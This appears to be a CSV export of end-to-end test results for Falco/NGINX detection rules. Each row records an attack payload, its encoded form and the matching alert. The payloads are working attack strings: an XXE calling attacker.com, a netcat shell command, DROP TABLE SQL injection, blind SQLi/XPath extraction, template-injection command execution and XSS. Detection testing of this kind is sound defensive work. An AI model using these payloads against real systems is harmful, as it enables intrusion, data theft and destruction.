"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_BLIND_001` |
| **Name** | Blind XXE with External DTD |
| **Category** | XXE |
| **Subcategory** | blind_xxe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://attacker.com/xxe"">]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 20:30:23.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1770841823402-3q7xxf pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1770841823402-3q7xxf pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
20:30:23.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1770841823402-3q7xxf pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1
```","1","test_e2e_with_logs[388_XXE_BLIND_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_EL_001` |
| **Name** | Expression Language Injection |
| **Category** | SSTI |
| **Subcategory** | expression_language |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `${7*7}`
- **Encoded**: `%24%7B7*7%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~36000ms
- **Timestamp**: 20:30:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_EL_001-1770841840409-bve3l pattern_id=SSTI_EL_001 uri=/?q=%24%7B7*7%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_EL_001-1770841840409-bve3l pattern_id=SSTI_EL_001 uri=/?q=%24%7B7*7%7D client=127.0.0.1

**Falco Log Entry**:
```
20:30:40.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_EL_001-1770841840409-bve3l pattern_id=SSTI_EL_001 uri=/?q=%24%7B7*7%7D client=127.0.0.1
```","2","test_e2e_with_logs[440_SSTI_EL_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_003` |
| **Name** | MathML mutation XSS |
| **Category** | XSS |
| **Subcategory** | mutation_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<math><mi//xlink:href=""data:x,<script>alert('XSS')</script>"">`
- **Encoded**: `%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2C%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~69000ms
- **Timestamp**: 20:30:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_MUT_003-1770841807925-asfp2 pattern_id=XSS_MUT_003 uri=/?q=%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2C%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_MUT_003-1770841807925-asfp2 pattern_id=XSS_MUT_003 uri=/?q=%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2C%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:07.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_MUT_003-1770841807925-asfp2 pattern_id=XSS_MUT_003 uri=/?q=%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2C%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[168_XSS_MUT_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_BLIND_001` |
| **Name** | XPath substring blind injection |
| **Category** | XPATH |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' or substring(//user[1]/password,1,1)='a' or '1'='2`
- **Encoded**: `%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 20:30:30.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_BLIND_001-1770841830895-4toux pattern_id=XPATH_BLIND_001 uri=/?q=%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BLIND_001-1770841830895-4toux pattern_id=XPATH_BLIND_001 uri=/?q=%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272 client=127.0.0.1

**Falco Log Entry**:
```
20:30:30.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BLIND_001-1770841830895-4toux pattern_id=XPATH_BLIND_001 uri=/?q=%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272 client=127.0.0.1
```","2","test_e2e_with_logs[389_XPATH_BLIND_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_009` |
| **Name** | Template string polyglot |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: ``alert('XSS')``
- **Encoded**: `%60alert%28%27XSS%27%29%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 20:30:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_POLY_009-1770841829484-6k39fp pattern_id=XSS_POLY_009 uri=/?q=%60alert%28%27XSS%27%29%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_POLY_009-1770841829484-6k39fp pattern_id=XSS_POLY_009 uri=/?q=%60alert%28%27XSS%27%29%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:29.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_POLY_009-1770841829484-6k39fp pattern_id=XSS_POLY_009 uri=/?q=%60alert%28%27XSS%27%29%60 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[184_XSS_POLY_009]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_009` |
| **Name** | Window.open DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `window.open('javascript:alert(""DOM"")')`
- **Encoded**: `window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~65000ms
- **Timestamp**: 20:30:11.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1770841811435-etmos9 pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1770841811435-etmos9 pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:11.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1770841811435-etmos9 pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[153_XSS_DOM_009]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BACK_003` |
| **Name** | Reverse shell via backticks |
| **Category** | CMDI |
| **Subcategory** | backtick |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``nc -l -p 1234 -e /bin/bash``
- **Encoded**: `%60nc%20-l%20-p%201234%20-e%20%2Fbin%2Fbash%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 20:30:38.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_003-1770841838495-uza28w pattern_id=CMD_BACK_003 uri=/?q=%60nc%20-l%20-p%201234%20-e%20%2Fbin%2Fbash%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_003-1770841838495-uza28w pattern_id=CMD_BACK_003 uri=/?q=%60nc%20-l%20-p%201234%20-e%20%2Fbin%2Fbash%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:38.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_003-1770841838495-uza28w pattern_id=CMD_BACK_003 uri=/?q=%60nc%20-l%20-p%201234%20-e%20%2Fbin%2Fbash%60 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[293_CMD_BACK_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_056` |
| **Name** | Command Substitution $() |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(whoami)`
- **Encoded**: `%24%28whoami%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 20:30:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_ADV_056-1770841831974-n7uydb pattern_id=CMD_ADV_056 uri=/?q=%24%28whoami%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_ADV_056-1770841831974-n7uydb pattern_id=CMD_ADV_056 uri=/?q=%24%28whoami%29 client=127.0.0.1

**Falco Log Entry**:
```
20:30:31.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_ADV_056-1770841831974-n7uydb pattern_id=CMD_ADV_056 uri=/?q=%24%28whoami%29 client=127.0.0.1
```","2","test_e2e_with_logs[279_CMD_ADV_056]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_PEBBLE_001` |
| **Name** | Pebble command execution |
| **Category** | SSTI |
| **Subcategory** | pebble |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{% set cmd = ""id"" %}{{ system(cmd) }}`
- **Encoded**: `%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 20:30:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1770841837903-r93fos pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1770841837903-r93fos pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
20:30:37.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1770841837903-r93fos pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1
```","1","test_e2e_with_logs[515_SSTI_PEBBLE_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_008` |
| **Name** | First table name character discovery |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u' --`
- **Encoded**: `'%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 20:30:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_008-1770841826495-jvttu pattern_id=SQLI_BLIND_008 uri=/?q='%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_008-1770841826495-jvttu pattern_id=SQLI_BLIND_008 uri=/?q='%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:26.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_008-1770841826495-jvttu pattern_id=SQLI_BLIND_008 uri=/?q='%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[029_SQLI_BLIND_008]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_062` |
| **Name** | DOM insertAdjacentHTML |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `insertAdjacentHTML('beforeend','<script>alert(1)</script>')`
- **Encoded**: `insertAdjacentHTML%28%27beforeend%27%2C%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 20:30:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_062-1770841824971-5d66zv pattern_id=XSS_ADV_062 uri=/?q=insertAdjacentHTML%28%27beforeend%27%2C%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_062-1770841824971-5d66zv pattern_id=XSS_ADV_062 uri=/?q=insertAdjacentHTML%28%27beforeend%27%2C%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:24.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_062-1770841824971-5d66zv pattern_id=XSS_ADV_062 uri=/?q=insertAdjacentHTML%28%27beforeend%27%2C%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[130_XSS_ADV_062]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_MONGO_006` |
| **Name** | MongoDB $or Authentication Bypass |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | mongodb |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$or"": [{""username"": ""admin""}, {""username"": ""root""}]}`
- **Encoded**: `%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~30000ms
- **Timestamp**: 20:30:46.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_006-1770841846914-fb87z pattern_id=NOSQL_MONGO_006 uri=/?q=%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_006-1770841846914-fb87z pattern_id=NOSQL_MONGO_006 uri=/?q=%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D client=127.0.0.1

**Falco Log Entry**:
```
20:30:46.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_006-1770841846914-fb87z pattern_id=NOSQL_MONGO_006 uri=/?q=%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D client=127.0.0.1
```","2","test_e2e_with_logs[502_NOSQL_MONGO_006]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_STACK_001` |
| **Name** | Stacked query DROP TABLE attack |
| **Category** | SQLI |
| **Subcategory** | stacked_queries |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; DROP TABLE users; --`
- **Encoded**: `'%3B%20DROP%20TABLE%20users%3B%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~73000ms
- **Timestamp**: 20:30:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_001-1770841803931-hsb6ap pattern_id=SQLI_STACK_001 uri=/?q='%3B%20DROP%20TABLE%20users%3B%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_001-1770841803931-hsb6ap pattern_id=SQLI_STACK_001 uri=/?q='%3B%20DROP%20TABLE%20users%3B%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:03.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_001-1770841803931-hsb6ap pattern_id=SQLI_STACK_001 uri=/?q='%3B%20DROP%20TABLE%20users%3B%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[089_SQLI_STACK_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_008` |
| **Name** | Textarea onfocus XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<textarea onfocus=alert('XSS') autofocus>`
- **Encoded**: `%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~79000ms
- **Timestamp**: 20:29:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1770841797901-7b06pc pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1770841797901-7b06pc pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:29:57.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1770841797901-7b06pc pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[193_XSS_REFL_008]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_LOG_002` |
| **Name** | Fake Log Entry Injection |
| **Category** | CRLF |
| **Subcategory** | log_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `\r\nFake-Log-Entry`
- **Encoded**: `%0d%0aFake-Log-Entry`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~4000ms
- **Timestamp**: 20:31:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_LOG_002-1770841872400-i98zqmz pattern_id=CRLF_LOG_002 uri=/?q=%0d%0aFake-Log-Entry client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_LOG_002-1770841872400-i98zqmz pattern_id=CRLF_LOG_002 uri=/?q=%0d%0aFake-Log-Entry client=127.0.0.1

**Falco Log Entry**:
```
20:31:12.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_LOG_002-1770841872400-i98zqmz pattern_id=CRLF_LOG_002 uri=/?q=%0d%0aFake-Log-Entry client=127.0.0.1
```","2","test_e2e_with_logs[485_CRLF_LOG_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
